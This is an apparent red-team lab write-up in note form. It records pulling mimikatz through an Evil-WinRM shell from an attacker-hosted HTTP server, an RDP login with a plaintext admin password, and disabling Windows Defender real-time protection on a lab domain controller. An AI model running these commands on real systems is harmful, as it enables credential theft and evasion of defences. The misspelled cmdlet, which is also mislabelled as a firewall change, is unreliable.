## Download mimikatz

[[Dumping secrets from CORPDC#Connect to RDP with the Administrator's credentials|Connect to CORP.DC with Administration credentials]]

NOTE: If you can't connect , go to [[Dumping secrets from CORPDC]]



### Enable http.server using python and proxychains on the Attacking machine


~/…/red_team_recon/Capstone_Challenge/Capstone_Challenge_Resources/Tools/mimikatz_trunk/x64$  `proxychains -q python3 -m http.server`

### Get mimikatz
On the tools provided on Capstone challenge folder you can find mimikatz.
Run on the Evil-WinRM shell the following command.

Evil-WinRM* PS C:\Users\Administrator> `wget http://10.50.110.16:8000/mimikatz.exe -o mimikatz.exe`

#### Connect to RDP with the Administrator's credentials

$ `proxychains4 -q xfreerdp /v:10.200.113.102 /u:Administrator /p:Hacker@123` 


## Disable CORP.DC firewall

Disabled firewall.

PS C:\Users\Administrator> `Set-MpPreferenca -DisableRealTimeMonitoring $true`

![[Preparing the path-20240607144158824.webp]]
## Disable virus protection

Disable virus and turned off Real-time protection from settings.
- **Open Windows Security:**
    
    - Click on the **Start** button.
    - Type **Windows Security** in the search bar and press Enter.
    - Alternatively, you can also find it by navigating through **Settings > Update & Security > Windows Security**.
    - ![[Preparing the path-20240607143234384.webp]]

